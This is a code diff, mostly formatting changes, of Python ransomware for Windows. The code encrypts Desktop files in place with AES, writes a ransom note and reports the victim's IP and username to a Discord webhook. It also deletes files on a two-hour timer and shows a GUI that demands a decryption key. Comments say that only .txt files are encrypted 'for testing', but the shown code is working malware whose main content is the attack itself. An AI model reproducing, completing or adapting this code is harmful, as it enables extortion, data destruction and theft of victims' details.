@@ -29,8 +29,6 @@ import win32com.client
 from win32com.client import Dispatch
 import win32api
 
-
-
 # Initialize global variables
 SPI_SETDESKWALLPAPER = 0x0014
 btcAdd = ""
@@ -71,6 +69,7 @@ otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', 
              '.key', 'wallet.dat']
 '''
 
+
 def set_wallpaper(image_filename):
     script_dir = os.path.dirname(os.path.abspath(__file__))
     image_path = os.path.join(script_dir, image_filename)
@@ -84,40 +83,44 @@ def set_wallpaper(image_filename):
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
     print(f"Wallpaper set to '{image_path}'.")
 
-#Define RW Class for functionality
-class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherits from pyqt, runnable object 4 multithreading
-    #encryptionPass = None
-    #decryptionPass = None
-    def __init__(self):                             # Constructor, inits Ransomware object in pyqt multithread envriroment
-        super(Ransomware, self).__init__()          # calls the constructor of qrunnable for intialization
-        self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
-        self.randomId = self.rID(12)                # generates a randID 12 length using rID method
-        self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
+
+# Define RW Class for functionality
+class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from pyqt, runnable object 4 multithreading
+    # encryptionPass = None # keep commented , need to globalize
+    # decryptionPass = None # keep commented, need to globalize
+    def __init__(self):  # Constructor, inits Ransomware object in pyqt multithread envriroment
+        super(Ransomware, self).__init__()  # calls the constructor of qrunnable for intialization
+        self.threadpool = PyQt5.QtCore.QThreadPool()  # creates an instance of Qthreadpool( manages pools of threads)
+        self.randomId = self.rID(12)  # generates a randID 12 length using rID method
+        self.encryptionPass = self.rSeed(32)  # generates random seed 32 length using rSeed
         self.decryptionPass = self.rSeed(32)
         print(f"Decryption key generated: {self.decryptionPass}")  # Print decryption key
-        self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"               # sets file path attribute 
-        self.ip = ""                                # inits ip attribute to empty string 4 later
-        self.userName = ""                          # inits userName attribute to empty string 4 later
-        key = self.encryptionPass.encode()          # encodes encryption pass into bytes to be used as key for encryption
-        self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor() # creates instance of AES enc algo, operates in ECB mode using default backend
+        self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"  # sets file path attribute
+        self.ip = ""  # inits ip attribute to empty string 4 later
+        self.userName = ""  # inits userName attribute to empty string 4 later
+        key = self.encryptionPass.encode()  # encodes encryption pass into bytes to be used as key for encryption
+        self.crypto = Cipher(algorithms.AES(key), modes.ECB(),
+                             backend=default_backend()).encryptor()  # creates instance of AES enc algo, operates in ECB mode using default backend
 
     # Write ransomware note on victims desktop
-    def readMe(self):                               # defines method within class
-        try:                                        # start of try block
-            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f: # opens file in r+w mode, if doesnt exit, will create it
-                f.write(ransomNote)                       # writes the content of the note
-        except Exception as e:                      # error catch
+    def readMe(self):  # defines method within class
+        try:  # start of try block
+            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt",
+                      "w+") as f:  # opens file in r+w mode, if doesnt exit, will create it
+                f.write(ransomNote)  # writes the content of the note
+        except Exception as e:  # error catch
             print(f"Error writing readme.txt: {e}")
-            
+
     # Retrieve details about victim's system
-    def getUserDetails(self):                       # Declares method 
-        try:                                        # try block
-            self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"] # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
-            self.userName = os.getlogin()           # uses the function to retrieve login name of user and assign it to attribute 
-        except Exception as e:                      # error catch
+    def getUserDetails(self):  # Declares method
+        try:  # try block
+            self.ip = requests.get("https://api.ipify.org?format=json").json()[
+                "ip"]  # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
+            self.userName = os.getlogin()  # uses the function to retrieve login name of user and assign it to attribute
+        except Exception as e:  # error catch
             print(f"Error getting user details: {e}")
 
-# Modify the encryption part of the encryptFile method
+    # Modify the encryption part of the encryptFile method
     @staticmethod
     def set_icon(icon_path, target_file_path):
         # Check if both the file and icon exist
@@ -127,18 +130,16 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         if not os.path.isfile(icon_path):
             print(f"Error: The specified icon file '{icon_path}' does not exist.")
             return
-    
+
         try:
             # Get absolute path for target file and icon
             target_file_path = os.path.abspath(target_file_path)
             icon_path = os.path.abspath(icon_path)
-        
+
             print(f"Icon set for '{target_file_path}' to '{icon_path}'.")
         except Exception as e:
             print(f"Error setting icon for '{target_file_path}': {e}")
 
-    
-    
     def encryptFile(self, file):
         try:
             key = self.encryptionPass.encode()  # Convert encryption pass to bytes
@@ -147,12 +148,13 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             # Read plaintext
             with open(file, 'rb+') as f:
                 plaintext = f.read()
-                padded_plaintext = padding.PKCS7(128).padder().update(plaintext) + padding.PKCS7(128).padder().finalize()  # Add padding to plaintext
+                padded_plaintext = padding.PKCS7(128).padder().update(plaintext) + padding.PKCS7(
+                    128).padder().finalize()  # Add padding to plaintext
                 ciphertext = cipher.update(padded_plaintext) + cipher.finalize()  # Encrypt plaintext
-                
+
                 # Move file pointer to the beginning of the file
                 f.seek(0)
-                
+
                 # Write encrypted data to the same file
                 f.write(ciphertext)
                 f.truncate()  # Truncate the file to remove any remaining plaintext
@@ -180,7 +182,6 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:
             print(f"Error decrypting {file}: {e}")
 
-
     def change_file_icon(self, file_name):
         try:
             desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
@@ -192,50 +193,39 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:
             print(f"Error changing file icon for {file_name}: {e}")
 
-
-    
-
     # Main method for ransomware functionality
 
     def run(self, userName):
         self.userName = userName
-        #print(f"User name for directory: {self.userName}")
-        #print("Starting encryption process...")
+        # print(f"User name for directory: {self.userName}")
+        # print("Starting encryption process...")
         self.sendMessage()
 
-        #print("Traversing directories and encrypting files...")
+        # print("Traversing directories and encrypting files...")
         for root, directories, files in os.walk(f"C:\\Users\\{self.userName}\\Desktop"):
             for filename in files:
                 filepath = os.path.join(root, filename)
-                #print(f"Filename of file to be encrypted: {filename}")
-                #print(f"Root of file to be encrypted: {root}")
-                #print(f"Filepath of file to be encrypted: {filepath}")
+                # print(f"Filename of file to be encrypted: {filename}")
+                # print(f"Root of file to be encrypted: {root}")
+                # print(f"Filepath of file to be encrypted: {filepath}")
                 if filename.endswith('.txt'):  # Encrypt only text files for testing
                     threading.Thread(target=self.encryptFile, args=(filepath,)).start()
-            
+
             for directory in directories:  # Traverse through subdirectories
                 subdir_path = os.path.join(root, directory)
                 for subdir_root, subdir_directories, subdir_files in os.walk(subdir_path):
                     for subdir_filename in subdir_files:
                         subdir_filepath = os.path.join(subdir_root, subdir_filename)
-                        #print(f"Subdirectory filename of file to be encrypted: {subdir_filename}")
-                        #print(f"Root of subdirectory file to be encrypted: {subdir_root}")
-                        #print(f"Subdirectory filepath of file to be encrypted: {subdir_filepath}")
+                        # print(f"Subdirectory filename of file to be encrypted: {subdir_filename}")
+                        # print(f"Root of subdirectory file to be encrypted: {subdir_root}")
+                        # print(f"Subdirectory filepath of file to be encrypted: {subdir_filepath}")
                         if subdir_filename.endswith('.txt'):  # Encrypt only text files for testing
                             threading.Thread(target=self.encryptFile, args=(subdir_filepath,)).start()
 
         self.readMe()
         print("Encryption process completed.")
 
-
-
-
-
-
-    
-
-
-    # Send message to Discord Webhook with victim details 
+    # Send message to Discord Webhook with victim details
 
     def sendMessage(self):
         try:
@@ -287,7 +277,6 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
 
-
     # Generate random string for encryption password
     def rSeed(self, stringLength):
         password_characters = string.ascii_letters
@@ -297,6 +286,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
     def rID(self, stringLength):
         password_characters = string.ascii_letters + string.digits
         return ''.join(random.choice(password_characters) for i in range(stringLength))
+
 
 # Define class for main GUI of ransomware
 class Worker(QObject):
@@ -319,6 +309,7 @@ class Worker(QObject):
         for k in range(101):
             self.progress_updated_3.emit(k)
             QThread.msleep(100)
+
 
 class RansomwareGUI(QMainWindow):
     def __init__(self, decryptionPass):
@@ -358,7 +349,7 @@ class RansomwareGUI(QMainWindow):
 
         userName = os.getlogin()
         ransomware_instance = Ransomware()
-        ransomware_instance.run(userName) 
+        ransomware_instance.run(userName)
         ransomware_instance.sendMessage()
         ransomware_instance.readMe()
 
@@ -391,6 +382,7 @@ class RansomwareGUI(QMainWindow):
                     color: #fff;                                
                 }
             """)
+
     def schedule_file_deletion(self):
         while True:
             time.sleep(2 * 60 * 60)  # Wait for two hours
@@ -423,15 +415,13 @@ class RansomwareGUI(QMainWindow):
                     encrypted_files.append(filepath)
         return encrypted_files
 
-    
     def promptDecryptionKey(self):
         # Prompt for decryption key
         text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
-    
+
         if ok:
             decryption_key = text
             self.decryptFiles(decryption_key)  # Pass the obtained decryption key to decryptFiles method
-
 
     def decryptFiles(self, decryption_key):
         if decryption_key:
@@ -443,7 +433,8 @@ class RansomwareGUI(QMainWindow):
                 for base in fileTypes:
                     if base in filepath:
                         print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
-                        threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+                        threading.Thread(target=ransomware_instance.decryptFile,
+                                         args=(filepath, decryption_key)).start()
             for directory in directories:  # Iterating over subdirectories
                 try:
                     for filename in os.listdir(os.path.join(root, directory)):
@@ -451,18 +442,11 @@ class RansomwareGUI(QMainWindow):
                         for base in fileTypes:
                             if base in filepath:
                                 print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
-                                threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+                                threading.Thread(target=ransomware_instance.decryptFile,
+                                                 args=(filepath, decryption_key)).start()
                 except PermissionError as e:
                     print(f"PermissionError: {e}. Skipping directory: {directory}")
 
-  
-
-
-
-
-
-
-        
     def initUI(self):
         # Create central widget
         central_widget = QWidget(self)
@@ -595,7 +579,7 @@ class RansomwareGUI(QMainWindow):
         event.accept()
 
 
-# Define ransom note and detailed ransom note 
+# Define ransom note and detailed ransom note
 detailedNote = f"""
 -------------------------------------------------------------------------------------------------------------------------
 Hello,\n
